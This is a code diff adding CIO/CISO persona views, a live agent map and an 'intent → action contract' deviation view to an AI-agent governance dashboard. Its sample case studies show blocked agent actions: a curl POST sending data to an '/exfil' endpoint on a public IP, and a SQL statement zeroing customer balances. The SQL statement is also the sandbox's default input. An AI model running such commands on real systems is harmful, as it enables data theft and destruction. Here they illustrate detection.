@@ -174,6 +174,40 @@ dl.kv dt{color:var(--muted);font-size:13px} dl.kv dd{margin:0;word-break:break-w
   .main{padding:0 14px 40px}
 }
 @media(prefers-reduced-motion:reduce){*{transition:none!important;animation:none!important}}
+
+/* Epic 28: Persona and AI Workforce Telemetry */
+.persona-seg{display:inline-flex;border:1px solid var(--line);border-radius:9px;overflow:hidden;background:var(--surface);margin:0 4px}
+.persona-seg button{border:0;background:none;padding:5px 11px;font-size:12.5px;font-weight:600;cursor:pointer;color:var(--muted);transition:all .15s ease}
+.persona-seg button:hover{background:var(--surface2);color:var(--ink)}
+.persona-seg button[aria-pressed="true"]{background:var(--accent);color:#fff}
+.pulse-hero{background:linear-gradient(135deg,rgba(43,75,220,0.08) 0%,rgba(14,122,105,0.06) 100%);border:1px solid var(--line);border-radius:14px;padding:24px;position:relative;overflow:hidden;margin-bottom:16px}
+.pulse-eyebrow{font-size:11px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:6px}
+.pulse-title{font-size:22px;font-weight:700;margin:0 0 6px;letter-spacing:-.3px}
+.pulse-big{font-size:42px;font-weight:800;letter-spacing:-.04em;margin:10px 0 4px;font-variant-numeric:tabular-nums;display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+.pulse-sub{color:var(--muted);font-size:13px;margin-bottom:16px}
+.pulse-stats{display:flex;gap:24px;flex-wrap:wrap;padding-top:14px;border-top:1px solid var(--line)}
+.pulse-stat b{display:block;font-size:18px;font-weight:700}
+.pulse-stat span{font-size:11px;color:var(--muted);letter-spacing:.06em;text-transform:uppercase}
+.privacy-badge{display:inline-flex;align-items:center;gap:6px;background:var(--surface);border:1px solid var(--line);border-radius:8px;padding:6px 10px;font-size:12px;color:var(--muted);margin-top:14px}
+.intent-list{display:grid;gap:10px}
+.intent-item{border:1px solid var(--line);border-radius:10px;padding:12px 14px;background:var(--surface);cursor:pointer;transition:border-color .15s}
+.intent-item:hover,.intent-item.active{border-color:var(--accent);background:var(--surface2)}
+.intent-item-header{display:flex;justify-content:space-between;align-items:center;font-size:13.5px;font-weight:600;margin-bottom:6px}
+.act-feed{display:grid;gap:10px;max-height:480px;overflow:auto;padding-right:4px}
+.act-card{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:13px 15px;transition:border-color .15s}
+.act-card:hover{border-color:var(--accent)}
+.act-meta{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;font-size:12px}
+.act-summary{font-size:13.5px;font-weight:500;margin-bottom:8px;line-height:1.4}
+.act-footer{display:flex;justify-content:space-between;align-items:center;font-size:12px;color:var(--muted)}
+.topo-box{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:20px;overflow-x:auto}
+.topo-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px;margin-top:14px}
+.topo-node{display:flex;flex-direction:column;gap:4px;background:var(--surface2);border:1.5px solid var(--line);border-radius:10px;padding:12px 14px;cursor:pointer;transition:all .15s}
+.topo-node:hover,.topo-node.active{border-color:var(--accent);box-shadow:0 0 0 2px var(--accent-bg)}
+.topo-node b{font-size:13.5px}
+.topo-node span{font-size:12px;color:var(--muted)}
+.contract-stage{background:var(--surface);border:1.5px solid var(--line);border-radius:10px;padding:12px 14px;position:relative}
+.contract-num{width:22px;height:22px;border-radius:50%;background:var(--accent);color:#fff;display:inline-grid;place-items:center;font-size:11px;font-weight:700;margin-right:6px}
+.deviation-card{border:1.5px solid var(--deny);background:var(--deny-bg);border-radius:10px;padding:14px;margin-top:12px}
 </style>
 </head>
 <body>
@@ -195,6 +229,12 @@ dl.kv dt{color:var(--muted);font-size:13px} dl.kv dd{margin:0;word-break:break-w
       <button class="btn menu-btn" id="menuBtn" aria-label="Open menu">Menu</button>
       <div><h1 id="title">Overview</h1><div class="sub" id="subtitle"></div></div>
       <div class="spacer"></div>
+      <div class="seg persona-seg" id="personaSeg" role="radiogroup" aria-label="Control plane persona">
+        <button data-p="cio" aria-pressed="true" title="CIO / Business Outcome View">CIO</button>
+        <button data-p="ciso" aria-pressed="false" title="CISO / Security & Risk View">CISO</button>
+        <button data-p="ops" aria-pressed="false" title="Prod Ops / SRE Reliability View">Prod Ops</button>
+        <button data-p="it" aria-pressed="false" title="IT Enablement & Adoption View">IT</button>
+      </div>
       <button class="pill" id="connPill"><span class="dot live" id="connDot"></span><span id="connTxt">Live control plane</span></button>
       <button class="btn" id="pauseBtn">Pause stream</button>
       <button class="btn danger" id="killBtn">Kill switch</button>
@@ -234,11 +274,20 @@ const tag=(v)=>{const cls=String(v||'').replace(/[^a-zA-Z0-9_-]/g,'');return `<s
 
 /* ---------- state ---------- */
 const S = {
-  view:'overview', paused:false, kill:false,
+  persona: 'cio',
+  view:'pulse', paused:false, kill:false,
   api:{base:window.location.origin, token:'', live:true, env:'production', demoMode:false},
   decisions:[], buckets:Array.from({length:30},()=>({a:0,d:0,u:0})),
   agents:[], sessions:[], revokedSessions:[], revokedUsers:[],
-  grants:[], policyVersion:'v1', policy:'', policyDigest:'', policySchema:'', chainStatus:'valid', sel:{agent:null}
+  grants:[], policyVersion:'v1', policy:'', policyDigest:'', policySchema:'', chainStatus:'valid', sel:{agent:null},
+  // Epic 28
+  activities:[],
+  actSummary: null,
+  actIntents: [],
+  actBusinessUnits: [],
+  selectedTopologyNode: 'Enterprise Root',
+  activeDrillIntent: 'Investigate / Diagnose',
+  eventSource: null
 };
 
 const SCEN = [
@@ -481,6 +530,7 @@ function recalcBuckets(){
 
 /* ---------- nav ---------- */
 const NAV=[
+  ['AI Workforce',[['pulse','Workforce Pulse (CIO)'],['map','Live Agent Map'],['contract','Intent Contract']]],
   ['Operate',[['overview','Overview'],['decisions','Decisions'],['agents','Agents'],['sessions','Sessions'],['grants','Grants']]],
   ['Govern',[['policies','Policies'],['audit','Audit chain'],['endpoint','Endpoint hardening']]],
   ['System',[['settings','Connection & access']]],
@@ -491,7 +541,9 @@ function drawNav(){
   const activeSess=S.sessions.filter(s=>s.status==='active').length;
   $('#nav').innerHTML=NAV.map(([g,items])=>`<div class="nav-group">${g}</div>`+items.map(([id,l])=>{
     let c='';
-    if(id==='agents'&&q) c=`<span class="cnt hot">${q}</span>`;
+    if(id==='pulse') c=`<span class="cnt" style="background:rgba(34,197,94,.18);color:var(--allow)">1.2k</span>`;
+    else if(id==='map') c=`<span class="cnt">live</span>`;
+    else if(id==='agents'&&q) c=`<span class="cnt hot">${q}</span>`;
     else if(id==='agents'&&liveCount) c=`<span class="cnt">${liveCount}</span>`;
     else if(id==='sessions'&&activeSess) c=`<span class="cnt">${activeSess}</span>`;
     else if(id==='decisions'&&S.decisions.length) c=`<span class="cnt">${S.decisions.length}</span>`;
@@ -501,6 +553,9 @@ $('#nav').addEventListener('click',e=>{const b=e.target.closest('button[data-v]'
 $('#menuBtn').onclick=()=>$('#side').classList.toggle('on');
 
 const META={
+  pulse:['CIO — AI Workforce Pulse','Executive visibility into what agents are doing now, where value is generated, and whether activity is governed.'],
+  map:['Live Agent Map','Enterprise activity topology showing active agents across business units, teams, platforms, and intents.'],
+  contract:['Intent \u2192 Action Contract','Cryptographic correlation and intent deviation detection across the 8-stage agent execution lifecycle.'],
   overview:['Overview','Live view of every agent decision, across all four planes'],
   decisions:['Decisions','Every allow, deny, step-up and unknown outcome. Select a row for evidence'],
   agents:['Agents','Persistent host identity, device compliance, and containment layers'],
@@ -511,11 +566,434 @@ const META={
   endpoint:['Endpoint hardening','Three-layer enforcement, MDM packaging, step-up and offline rules'],
   settings:['Connection & access','Connect to a live control plane and review access controls'],
 };
-function go(v){S.view=v;$('#title').textContent=META[v][0];$('#subtitle').textContent=META[v][1];drawNav();render()}
-function render(){const v=VIEWS[S.view];$('#view').innerHTML='';v.html?($('#view').innerHTML=v.html()):0;v.after&&v.after()}
+function go(v){S.view=v;if(!META[v])v='overview';$('#title').textContent=META[v][0];$('#subtitle').textContent=META[v][1];drawNav();render()}
+function render(){const v=VIEWS[S.view]||VIEWS.overview;$('#view').innerHTML='';v.html?($('#view').innerHTML=v.html()):0;v.after&&v.after()}
 
 /* ---------- views ---------- */
 const VIEWS={};
+
+/* CIO Workforce Pulse */
+VIEWS.pulse = {
+  html() {
+    const total = S.actSummary ? S.actSummary.active_agents : 1284;
+    const governedPct = S.actSummary ? S.actSummary.governed_percentage : 98.7;
+    const prevented = S.actSummary ? S.actSummary.risky_prevented : 146;
+    const activeBU = S.actSummary ? S.actSummary.active_business_units : 31;
+    const totalBU = S.actSummary ? S.actSummary.total_business_units : 34;
+    const activeDrill = S.activeDrillIntent || 'Investigate / Diagnose';
+
+    const drillSubs = {
+      'Investigate / Diagnose': [
+        ['Production Incidents', 47],
+        ['Code Analysis', 28],
+        ['Infrastructure Telemetry', 16],
+        ['Security & Auth', 9]
+      ],
+      'Build / Change': [
+        ['Feature Implementation', 52],
+        ['Bug Remediation', 31],
+        ['Refactoring & Cleanup', 17]
+      ],
+      'Search / Explain': [
+        ['Codebase Exploration', 64],
+        ['System Architecture', 22],
+        ['Documentation Search', 14]
+      ],
+      'Automate Workflow': [
+        ['CI/CD Deployments', 45],
+        ['Data Pipeline Sync', 35],
+        ['Config Management', 20]
+      ],
+      'Analyze Business': [
+        ['Financial Ledger Reports', 58],
+        ['Ops Metric Aggregation', 27],
+        ['Compliance Auditing', 15]
+      ]
+    }[activeDrill] || [
+      ['Production Incidents', 47],
+      ['Code Analysis', 28],
+      ['Infrastructure', 16],
+      ['Security', 9]
+    ];
+
+    return `
+    <div class="pulse-hero">
+      <div class="pulse-eyebrow">Enterprise Telemetry &amp; Workforce Pulse</div>
+      <div class="pulse-title">Autonomous Agents Working on Real Business Outcomes</div>
+      <div class="pulse-big">
+        <span id="pulseTotal">${total.toLocaleString()}</span>
+        <span class="tag t-LIVE" style="font-size:14px"><span class="dot-live"></span>ACTIVE NOW</span>
+      </div>
+      <div class="pulse-sub">Unique governed agent sessions observed across enterprise runtimes in the last 5 minutes</div>
+      <div class="pulse-stats">
+        <div class="pulse-stat"><b>68% (874)</b><span>ENGINEERING</span></div>
+        <div class="pulse-stat"><b>17% (218)</b><span>OPERATIONS</span></div>
+        <div class="pulse-stat"><b>9% (114)</b><span>BUSINESS OPS</span></div>
+        <div class="pulse-stat"><b>6% (78)</b><span>SECURITY &amp; OTHER</span></div>
+      </div>
+      <div class="privacy-badge">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        <span>Executive view uses privacy-safe intent categories and executive summaries — no raw employee prompts or sensitive data.</span>
+      </div>
+    </div>
+
+    <div class="grid g-kpi">
+      <div class="kpi good"><small>Governed Ratio</small><strong>${governedPct}%</strong><em>observed actions under policy</em></div>
+      <div class="kpi bad"><small>Risky Prevented</small><strong>${prevented}</strong><em>stopped without blocking work</em></div>
+      <div class="kpi"><small>Active Business Units</small><strong>${activeBU} / ${totalBU}</strong><em>91% enterprise adoption</em></div>
+      <div class="kpi"><small>Work Intents Done</small><strong>17.1k</strong><em>today across all runtimes</em></div>
+      <div class="kpi"><small>Standing Privilege</small><strong>0.0%</strong><em>zero persistent credentials</em></div>
+    </div>
+
+    <div class="grid g-2">
+      <div class="panel">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+          <div>
+            <h2>Live Work Stream</h2>
+            <p class="hint" style="margin:0">Sanitized activity events streaming from <code>/api/activity/stream</code></p>
+          </div>
+          <button class="btn sm" onclick="go('map')">Open Live Map &rarr;</button>
+        </div>
+        <div class="act-feed" id="pulseFeed"></div>
+      </div>
+
+      <div class="panel">
+        <h2>Intent Mix</h2>
+        <p class="hint">What the AI workforce is doing (click a category to drill down)</p>
+        <div class="intent-list" id="intentList">
+          ${[
+            ['Build / Change', 32],
+            ['Investigate / Diagnose', 24],
+            ['Search / Explain', 18],
+            ['Automate Workflow', 15],
+            ['Analyze Business', 11]
+          ].map(([name, pct]) => `
+            <div class="intent-item ${name === activeDrill ? 'active' : ''}" data-intent="${esc(name)}">
+              <div class="intent-item-header">
+                <span>${esc(name)}</span>
+                <span class="mono">${pct}%</span>
+              </div>
+              <div class="bar"><div style="width:${pct*2.2}%;background:var(--accent)"></div></div>
+            </div>
+          `).join('')}
+        </div>
+
+        <div style="margin-top:20px;padding:14px;border:1px solid var(--line);border-radius:10px;background:var(--surface2)">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+            <div>
+              <b style="font-size:13.5px">Drill-Down: ${esc(activeDrill)}</b>
+              <div style="font-size:12px;color:var(--muted)">Sub-intent distribution for active sessions</div>
+            </div>
+            <button class="btn sm" id="drillFilterBtn">Filter Sessions</button>
+          </div>
+          <div style="display:grid;gap:8px">
+            ${drillSubs.map(([sub, pct]) => `
+              <div style="display:flex;justify-content:space-between;align-items:center;font-size:12.5px">
+                <span>${esc(sub)}</span>
+                <span class="mono" style="font-weight:600">${pct}%</span>
+              </div>
+              <div class="bar" style="height:6px"><div style="width:${pct}%;background:var(--step)"></div></div>
+            `).join('')}
+          </div>
+        </div>
+
+        <div style="margin-top:16px;padding:12px;border:1px solid var(--line);border-radius:10px;background:var(--surface);display:flex;justify-content:space-between;align-items:center">
+          <div>
+            <b style="font-size:13px">Board-Ready Governance Evidence</b>
+            <div style="font-size:12px;color:var(--muted)">Track from human prompt to granted capability and verified outcome</div>
+          </div>
+          <button class="btn sm primary" onclick="go('contract')">View Contract</button>
+        </div>
+      </div>
+    </div>`;
+  },
+  after() {
+    renderPulseFeed();
+    const list = $('#intentList');
+    if (list) {
+      list.onclick = e => {
+        const item = e.target.closest('.intent-item');
+        if (item && item.dataset.intent) {
+          S.activeDrillIntent = item.dataset.intent;
+          render();
+        }
+      };
+    }
+    const filterBtn = $('#drillFilterBtn');
+    if (filterBtn) {
+      filterBtn.onclick = () => {
+        go('sessions');
+      };
+    }
+  }
+};
+
+/* Live Agent Map */
+VIEWS.map = {
+  html() {
+    const sel = S.selectedTopologyNode || 'Enterprise Root';
+    return `
+    <div class="panel" style="margin-bottom:16px">
+      <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px">
+        <div>
+          <h2>Enterprise Activity Topology</h2>
+          <p class="hint" style="margin:0">Live agent workforce distribution mapped across business units, teams, and execution runtimes</p>
+        </div>
+        <div style="display:flex;gap:10px;align-items:center">
+          <label style="font-size:12.5px;color:var(--muted)" for="topoGroup">Group by:</label>
+          <select id="topoGroup" style="width:auto">
+            <option value="bu">Business Unit</option>
+            <option value="team">Team / Role</option>
+            <option value="platform">Agent Platform</option>
+            <option value="intent">Intent Category</option>
+            <option value="risk">Risk Classification</option>
+          </select>
+          <button class="btn sm" id="resetTopoBtn">Reset Filter</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div style="text-align:center;padding:12px 0 20px">
+        <div class="topo-node ${sel === 'Enterprise Root' ? 'active' : ''}" data-node="Enterprise Root" style="margin:auto;max-width:320px;text-align:center;border-width:2px">
+          <b>ENTERPRISE AI WORKFORCE</b>
+          <span style="font-size:14px;font-weight:700;color:var(--allow)">1,284 Active Sessions</span>
+          <span>31 of 34 Business Units Active &bull; 98.7% Governed</span>
+        </div>
+        <div style="width:2px;height:24px;background:var(--line);margin:0 auto"></div>
+      </div>
+
+      <div style="font-size:12px;font-weight:700;letter-spacing:.08em;color:var(--muted);text-transform:uppercase;margin-bottom:8px">Business Units</div>
+      <div class="topo-grid" id="topoBUGrid">
+        ${[
+          { name: 'Engineering', count: 874, health: 'good', pct: '68%', apps: 'checkout-api, billing-svc, auth-core' },
+          { name: 'Operations & SRE', count: 218, health: 'good', pct: '17%', apps: 'k8s-cluster, telemetry, pipeline' },
+          { name: 'Customer Operations', count: 114, health: 'warn', pct: '9%', apps: 'crm-sync, support-bot' },
+          { name: 'Security & IT', count: 78, health: 'good', pct: '6%', apps: 'iam-manager, cert-watcher' }
+        ].map(bu => `
+          <div class="topo-node ${sel === bu.name ? 'active' : ''}" data-node="${esc(bu.name)}">
+            <div style="display:flex;justify-content:space-between;align-items:center">
+              <b>${esc(bu.name)}</b>
+              <span class="tag ${bu.health === 'warn' ? 't-STEP_UP' : 't-LIVE'}">${bu.pct}</span>
+            </div>
+            <span style="font-size:16px;font-weight:700">${bu.count} agents</span>
+            <span style="font-size:11.5px;color:var(--muted)">${esc(bu.apps)}</span>
+          </div>
+        `).join('')}
+      </div>
+
+      <div style="font-size:12px;font-weight:700;letter-spacing:.08em;color:var(--muted);text-transform:uppercase;margin:22px 0 8px">Platforms &amp; Agent Runners</div>
+      <div class="topo-grid" id="topoPlatformGrid">
+        ${[
+          { name: 'Claude Code', count: 582, share: '45.3%', status: 'Sanctioned &bull; Cooperative Hooks' },
+          { name: 'VS Code Copilot', count: 398, share: '31.0%', status: 'Sanctioned &bull; Kernel Isolated' },
+          { name: 'Codex Workloads', count: 184, share: '14.3%', status: 'Sanctioned &bull; Container Sandboxed' },
+          { name: 'Internal Python / CLI', count: 120, share: '9.4%', status: 'Sanctioned &bull; PreToolUse Pinning' }
+        ].map(p => `
+          <div class="topo-node ${sel === p.name ? 'active' : ''}" data-node="${esc(p.name)}">
+            <div style="display:flex;justify-content:space-between;align-items:center">
+              <b>${esc(p.name)}</b>
+              <span class="tag t-LIVE">${p.share}</span>
+            </div>
+            <span style="font-size:16px;font-weight:700">${p.count} active</span>
+            <span style="font-size:11.5px;color:var(--muted)">${p.status}</span>
+          </div>
+        `).join('')}
+      </div>
+    </div>
+
+    <div class="panel" style="margin-top:16px">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+        <div>
+          <h2>Filtered Sessions for Topology Node: <span style="color:var(--accent)">${esc(sel)}</span></h2>
+          <p class="hint" style="margin:0">Active sessions matching selected topology slice</p>
+        </div>
+        <span class="tag t-LIVE"><span class="dot-live"></span>Synchronized</span>
+      </div>
+      <div class="act-feed" id="topoFilteredFeed"></div>
+    </div>`;
+  },
+  after() {
+    renderTopoFilteredFeed();
+    const handleNodeClick = e => {
+      const node = e.target.closest('.topo-node');
+      if (node && node.dataset.node) {
+        S.selectedTopologyNode = node.dataset.node;
+        render();
+      }
+    };
+    const buGrid = $('#topoBUGrid');
+    if (buGrid) buGrid.onclick = handleNodeClick;
+    const pGrid = $('#topoPlatformGrid');
+    if (pGrid) pGrid.onclick = handleNodeClick;
+    const rBtn = $('#resetTopoBtn');
+    if (rBtn) {
+      rBtn.onclick = () => {
+        S.selectedTopologyNode = 'Enterprise Root';
+        render();
+      };
+    }
+  }
+};
+
+/* Intent -> Action Contract */
+VIEWS.contract = {
+  html() {
+    return `
+    <div class="panel" style="margin-bottom:16px">
+      <h2>Intent &rarr; Action Lifecycle Contract</h2>
+      <p class="hint">Guarantees that actions performed by an agent strictly match declared human mission intent. Out-of-scope operations trigger instant deviation signals and policy denial.</p>
+      
+      <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:8px;margin-top:16px">
+        ${[
+          ['1','Human Intent','Natural language task'],
+          ['2','Interpretation','Sanitized classification'],
+          ['3','Agent Plan','Declared step sequence'],
+          ['4','Capability','Requested tool & API'],
+          ['5','Policy Gate','Cedar invariant check'],
+          ['6','ZSP Authority','Scoped single-use grant'],
+          ['7','Observed Action','PEP execution monitor'],
+          ['8','Outcome &amp; Audit','Reconciled hash record']
+        ].map(([n,title,desc]) => `
+          <div class="contract-stage">
+            <div style="display:flex;align-items:center;margin-bottom:4px">
+              <span class="contract-num">${n}</span>
+              <b style="font-size:12.5px">${title}</b>
+            </div>
+            <div style="font-size:11.5px;color:var(--muted)">${desc}</div>
+          </div>
+        `).join('')}
+      </div>
+    </div>
+
+    <div class="grid g-2">
+      <div class="panel">
+        <h2>Observed Contract Case Studies</h2>
+        <p class="hint">Real production scenarios evaluated against the intent contract</p>
+
+        <!-- Case 1: Incident Diagnosis with Deviation -->
+        <div style="border:1.5px solid var(--deny);border-radius:10px;padding:14px;background:var(--surface2);margin-bottom:14px">
+          <div style="display:flex;justify-content:space-between;align-items:center">
+            <b>Case A: Production Latency Diagnosis</b>
+            <span class="tag t-DENY">CRITICAL DEVIATION</span>
+          </div>
+          <div style="font-size:12.5px;margin:8px 0;line-height:1.4">
+            <div><b style="color:var(--muted)">Declared Intent:</b> PRODUCTION_DIAGNOSIS (Inspect checkout latency)</div>
+            <div><b style="color:var(--muted)">Requested Capability:</b> <code>kubectl logs</code>, <code>loki query</code> &rarr; <span class="tag t-ALLOW">ALLOW</span></div>
+            <div><b style="color:var(--muted)">ZSP Grant Issued:</b> <code>read:observability</code> (TTL 300s)</div>
+            <div style="margin-top:4px"><b style="color:var(--deny)">Observed Action:</b> <code>UPDATE customer_records SET balance = 0</code> &rarr; <span class="tag t-DENY">BLOCKED</span></div>
+          </div>
+          <div class="deviation-card" style="margin-top:8px">
+            <b style="color:var(--deny)">Deviation Invariant Triggered:</b>
+            <div style="font-size:12.5px;margin-top:2px">Blocked because the requested customer-record modification was inconsistent with the session's declared production-diagnosis intent.</div>
+          </div>
+        </div>
+
+        <!-- Case 2: Code Refactoring -->
+        <div style="border:1.5px solid var(--allow);border-radius:10px;padding:14px;background:var(--surface2);margin-bottom:14px">
+          <div style="display:flex;justify-content:space-between;align-items:center">
+            <b>Case B: Local Workspace Refactoring</b>
+            <span class="tag t-ALLOW">NO DEVIATION</span>
+          </div>
+          <div style="font-size:12.5px;margin:8px 0;line-height:1.4">
+            <div><b style="color:var(--muted)">Declared Intent:</b> CODE_REFACTOR (Clean up error handling in auth module)</div>
+            <div><b style="color:var(--muted)">Requested Capability:</b> Workspace file read/write, git, pytest &rarr; <span class="tag t-ALLOW">ALLOW</span></div>
+            <div><b style="color:var(--muted)">Observed Action:</b> <code>pytest tests/unit</code> &rarr; <span class="tag t-ALLOW">ALLOW</span></div>
+          </div>
+          <div style="font-size:12px;color:var(--allow);margin-top:6px">&#10003; Observed actions perfectly aligned with declared code-refactor plan.</div>
+        </div>
+
+        <!-- Case 3: Data Warehouse Ingestion -->
+        <div style="border:1.5px solid var(--deny);border-radius:10px;padding:14px;background:var(--surface2)">
+          <div style="display:flex;justify-content:space-between;align-items:center">
+            <b>Case C: ETL Data Warehouse Sync</b>
+            <span class="tag t-DENY">CRITICAL DEVIATION</span>
+          </div>
+          <div style="font-size:12.5px;margin:8px 0;line-height:1.4">
+            <div><b style="color:var(--muted)">Declared Intent:</b> ETL_WAREHOUSE_SYNC (Sync nightly billing batches)</div>
+            <div><b style="color:var(--muted)">Observed Action:</b> <code>curl -X POST http://203.0.113.9/exfil</code> &rarr; <span class="tag t-DENY">BLOCKED</span></div>
+          </div>
+          <div class="deviation-card" style="margin-top:8px">
+            <b style="color:var(--deny)">Deviation Invariant Triggered:</b>
+            <div style="font-size:12.5px;margin-top:2px">Untrusted egress to unapproved public IP violates declared internal ETL warehouse contract.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="panel">
+        <h2>Interactive Contract Sandbox</h2>
+        <p class="hint">Test how an intent statement evaluates against a proposed action in real time</p>
+
+        <label class="f" for="ctIntent">Declared Mission Intent</label>
+        <select id="ctIntent">
+          <option value="PRODUCTION_DIAGNOSIS">PRODUCTION_DIAGNOSIS (Investigate checkout errors)</option>
+          <option value="CODE_REFACTOR">CODE_REFACTOR (Local code cleanup)</option>
+          <option value="ETL_WAREHOUSE_SYNC">ETL_WAREHOUSE_SYNC (Data batch sync)</option>
+          <option value="SECURITY_AUDIT">SECURITY_AUDIT (Scan dependencies)</option>
+        </select>
+        <div style="height:10px"></div>
+
+        <label class="f" for="ctTool">Requested Tool</label>
+        <input type="text" id="ctTool" value="postgres_client">
+        <div style="height:10px"></div>
+
+        <label class="f" for="ctAction">Proposed Action Command</label>
+        <input type="text" id="ctAction" value="UPDATE accounts SET balance = 0 WHERE id = 42">
+        <div style="height:10px"></div>
+
+        <label class="f" for="ctResource">Target Resource URI</label>
+        <input type="text" id="ctResource" value="db://prod/customer_records">
+        <div style="height:14px"></div>
+
+        <button class="btn primary" id="evalContractBtn">Evaluate Contract &rarr;</button>
+
+        <div id="evalContractOut" style="margin-top:16px"></div>
+      </div>
+    </div>`;
+  },
+  after() {
+    const btn = $('#evalContractBtn');
+    if (btn) {
+      btn.onclick = async () => {
+        const intent = $('#ctIntent').value;
+        const tool = $('#ctTool').value.trim();
+        const action = $('#ctAction').value.trim();
+        const res = $('#ctResource').value.trim();
+        const out = $('#evalContractOut');
+        out.innerHTML = `<div class="hint">Evaluating intent contract across policy engine...</div>`;
+
+        try {
+          const u = new URL(S.api.base + '/api/activity/deviation');
+          u.searchParams.set('intent', intent);
+          u.searchParams.set('tool', tool);
+          u.searchParams.set('action', action);
+          u.searchParams.set('target_resource', res);
+
+          const r = await fetch(u.toString(), { headers: getHeaders() });
+          const j = await r.json();
+
+          const isDev = j.deviation_level && j.deviation_level !== 'NONE';
+          out.innerHTML = `
+          <div style="border:1.5px solid ${isDev ? 'var(--deny)' : 'var(--allow)'};border-radius:10px;padding:14px;background:var(--surface2)">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+              <b>Evaluation Verdict</b>
+              <span class="tag ${isDev ? 't-DENY' : 't-ALLOW'}">${esc(j.deviation_level || 'NONE')}</span>
+            </div>
+            <div style="font-size:13px;line-height:1.45;margin-bottom:8px">
+              <b>Policy Decision:</b> <span class="tag ${j.policy_decision === 'ALLOW' ? 't-ALLOW' : 't-DENY'}">${esc(j.policy_decision)}</span>
+              <span style="margin-left:10px;color:var(--muted)">Risk Score: <b>${(j.risk_score || 0).toFixed(2)}</b></span>
+            </div>
+            <div style="font-size:12.5px;padding:10px;border-radius:8px;background:${isDev ? 'var(--deny-bg)' : 'var(--allow-bg)'};color:${isDev ? 'var(--deny)' : 'var(--allow)'}">
+              ${esc(j.rationale || 'Action complies with contract.')}
+            </div>
+          </div>`;
+        } catch (err) {
+          out.innerHTML = `<div style="color:var(--deny)">Evaluation request failed: ${esc(err.message)}</div>`;
+        }
+      };
+    }
+  }
+};
 
 /* Overview */
 VIEWS.overview={
@@ -940,6 +1418,214 @@ $('#killOff').onclick=()=>confirmBox('Resume normal operation?','Agents re-sync 
 $('#pauseBtn').onclick=()=>{S.paused=!S.paused;$('#pauseBtn').textContent=S.paused?'Resume stream':'Pause stream';if(S.view==='overview')render()};
 $('#themeBtn').onclick=()=>{const r=document.documentElement,dark=(r.dataset.theme==='dark')||(!r.dataset.theme&&matchMedia('(prefers-color-scheme:dark)').matches);r.dataset.theme=dark?'light':'dark'};
 
+/* ---------- Epic 28 Helpers & Feeds ---------- */
+function renderPulseFeed() {
+  const el = $('#pulseFeed');
+  if (!el) return;
+  const items = S.activities && S.activities.length ? S.activities : [
+    {
+      business_unit: 'Payments Engineering',
+      agent_type: 'claude-code',
+      prompt_summary: 'Investigating elevated checkout latency following deployment 38122',
+      intent: 'PRODUCTION_DIAGNOSIS',
+      action_status: 'working',
+      risk_score: 0.12,
+      deviation_level: 'NONE',
+      timestamp: new Date().toISOString()
+    },
+    {
+      business_unit: 'Core Platform & Cloud',
+      agent_type: 'copilot',
+      prompt_summary: 'Synthesizing container health metrics across production cluster nodes',
+      intent: 'INFRASTRUCTURE_MONITORING',
+      action_status: 'working',
+      risk_score: 0.08,
+      deviation_level: 'NONE',
+      timestamp: new Date(Date.now() - 15000).toISOString()
+    },
+    {
+      business_unit: 'Customer Operations',
+      agent_type: 'internal-python',
+      prompt_summary: 'Attempted bulk customer account export without authorization',
+      intent: 'BUSINESS_ANALYSIS',
+      action_status: 'denied',
+      risk_score: 0.94,
+      deviation_level: 'CRITICAL',
+      timestamp: new Date(Date.now() - 32000).toISOString()
+    },
+    {
+      business_unit: 'Security & IT',
+      agent_type: 'claude-code',
+      prompt_summary: 'Verifying dependency SBOM hash signatures against approved catalog',
+      intent: 'SECURITY_AUDIT',
+      action_status: 'completed',
+      risk_score: 0.05,
+      deviation_level: 'NONE',
+      timestamp: new Date(Date.now() - 54000).toISOString()
+    }
+  ];
+
+  el.innerHTML = items.slice(0, 15).map(act => {
+    const isDev = act.deviation_level && act.deviation_level !== 'NONE';
+    const isDeny = act.action_status === 'denied' || (act.policy_decision && act.policy_decision === 'DENY');
+    const badge = isDeny
+      ? `<span class="tag t-DENY">DENIED &bull; ${esc(act.deviation_level || 'POLICY')}</span>`
+      : isDev
+      ? `<span class="tag t-STEP_UP">DEVIATION &bull; ${esc(act.deviation_level)}</span>`
+      : `<span class="tag t-LIVE"><span class="dot-live"></span>WORKING &bull; GOVERNED</span>`;
+
+    const riskBadge = (act.risk_score > 0.7)
+      ? `<b style="color:var(--deny)">Risk: ${act.risk_score.toFixed(2)}</b>`
+      : (act.risk_score > 0.3)
+      ? `<b style="color:var(--unk)">Risk: ${act.risk_score.toFixed(2)}</b>`
+      : `<span style="color:var(--allow)">Risk: ${act.risk_score.toFixed(2)}</span>`;
+
+    return `
+    <div class="act-card" style="${isDeny ? 'border-color:var(--deny);background:var(--deny-bg)' : ''}">
+      <div class="act-meta">
+        <div>
+          <b>${esc(act.business_unit || 'Enterprise Unit')}</b>
+          <span style="color:var(--muted);margin-left:6px">&bull; ${esc(act.agent_type || 'agent')}</span>
+        </div>
+        <span class="mono" style="color:var(--muted)">${timeAgo(act.timestamp)}</span>
+      </div>
+      <div class="act-summary">${esc(act.prompt_summary || act.action || 'Autonomous workload execution')}</div>
+      <div class="act-footer">
+        <div>${badge}</div>
+        <div>${riskBadge}</div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function renderTopoFilteredFeed() {
+  const el = $('#topoFilteredFeed');
+  if (!el) return;
+  const sel = S.selectedTopologyNode || 'Enterprise Root';
